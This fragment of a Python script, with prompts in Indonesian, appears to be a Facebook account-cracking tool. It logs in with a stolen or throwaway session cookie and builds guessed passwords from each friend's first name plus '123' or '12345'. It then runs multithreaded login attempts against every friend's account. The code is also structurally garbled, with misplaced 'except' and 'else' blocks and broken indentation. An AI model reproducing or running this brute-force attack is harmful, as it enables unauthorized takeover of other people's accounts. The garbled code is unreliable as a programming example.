                        if choice == '2':
                            for friend in friends:
                                name = friend['name'].split()[0].lower()
                                passwords.extend([name, name + '123', name + '12345'])
                        else:  
                            if choice == '3':
                                manual_passwords = input('Silahkan Masukan Password, Anda Harus Menggunakan Lebih Dari[bold red] 6 Huruf[bold white] dan Anda Bisa Memakai Koma Untuk Password Acak, Contohnya :[bold green] Sayang,Cantik[bold white] *[bold red]Harap Isi Minimal Satu Password[bold white]!: ')
                                passwords = [p.strip() for p in manual_passwords.split(',')]
        except KeyboardInterrupt:
                            else:  
                                if choice == '4':
                                    manual_passwords = input('Silahkan Masukan Password, Anda Harus Menggunakan Lebih Dari[bold red] 6 Huruf[bold white] dan Anda Bisa Memakai Koma Untuk Password Acak, Contohnya :[bold green] Sayang,Cantik[bold white] *[bold red]Harap Isi Minimal Satu Password[bold white]!: ')
                                    manual = [p.strip() for p in manual_passwords.split(',')]
                                        for friend in friends:
                                            name = friend['name'].split()[0].lower()
                                            passwords.extend([name, name + '123', name + '12345'])
                                            passwords.extend(manual)
                    self.terminal.BANNER()
                    console.print(f'[bold white]Jumlah Username :[bold green] {len(friends)}')
                    with ThreadPoolExecutor(max_workers=10) as executor:
                        for friend in friends:
                            executor.submit(self.crack.METODE, friend['id'], passwords, cookie)
                console.print('[bold white]Terima Kasih Telah Menggunakan Program Kami, Kami Harap Anda Puas Dengan Hasil Yang Anda Dapatkan. Jika Anda Memiliki Pertanyaan Atau Saran, Jangan Ragu Untuk Menghubungi Kami!')
                sys.exit()

def main():
    try:
        terminal = TERMINAL()
        terminal.BANNER()
        terminal.TERMINAL_SIZE()
        terminal.CHECK_FLODER()
        terminal.ANTI_WIFI()
        console.print('[bold green]01[bold white]. Login Menggunakan Cookies Facebook ([bold green]GraphQL[bold white])\n[bold green]02[bold white]. Login Menggunakan Cookies Facebook ([bold yellow]Graph[bold white])\n[bold green]04[bold white]. Keluar ([bold red]Exit[bold white])')
        choice = input('[bold white] > [bold green]')
        if choice == '1':
            cookie = input('Silahkan Masukkan Cookies Akun Facebook, Anda Bisa Memakai Akun Baru Untuk Login dan Pastikan Untuk Mengguna\nkan[bold red] Autentikasi 2 Faktor[bold white] Agar Akun Tidak Mudah Terblokir!: ')
            login = LOGIN()
            user_id = login.COOKIES(cookie)
            token = login.UBAH_MENJADI_TOKEN(cookie)
            user = login.AKUN_SAYA(cookie, token)
            console.print('[bold green]LOGIN SUCCESS')
            menu = MENU()
            menu.UTAMA(cookie, token, user)
        else:  
            if choice == '2':
                cookie = input('Silahkan Masukkan Cookies Akun Facebook, Anda Bisa Memakai Akun Baru Untuk Login dan Pastikan Untuk Mengguna\nkan[bold red] Autentikasi 2 Faktor[bold white] Agar Akun Tidak Mudah Terblokir!: ')
                login = LOGIN()
                user_id = login.COOKIES(cookie)
                token = login.UBAH_MENJADI_TOKEN(cookie)
                user = login.AKUN_SAYA(cookie, token)
                console.print('[bold green]LOGIN SUCCESS')
                menu = MENU()
                menu.UTAMA(cookie, token, user)
    except KeyboardInterrupt:
            else:  
                if choice == '3':
                    console.print('[bold white]Anda Akan Diarahkan Ke Youtube Untuk Cara Mendapatkan Cookies Facebook, Anda Harus Melihat Di Youtube\nSampai Selesai Agar Paham *[bold red]Jangan Gunakan Akun Utama[bold white]!')
                    os.system('xdg-open https://youtu.be/3Y6xsMB3wRg')
                else:  
                    if choice == '4':
                        sys.exit()
                    else:  
                        console.print('[bold red]Pilihan Yang Anda Masukan Tidak Tersedia di Dalam Fitur, Anda Bisa Mencoba Dengan Pilihan Lain!')
                        main()
                    console.print('[bold white]Terima Kasih Telah Menggunakan Program Kami, Kami Harap Anda Puas Dengan Hasil Yang Anda Dapatkan. Jika Anda Memiliki Pertanyaan Atau Saran, Jangan Ragu Untuk Menghubungi Kami!')
                    sys.exit()
                except Exception as e:
                    console.print('[bold red]KONEKSI ERROR!')
                    sys.exit()
if __name__ == '__main__':
    main()
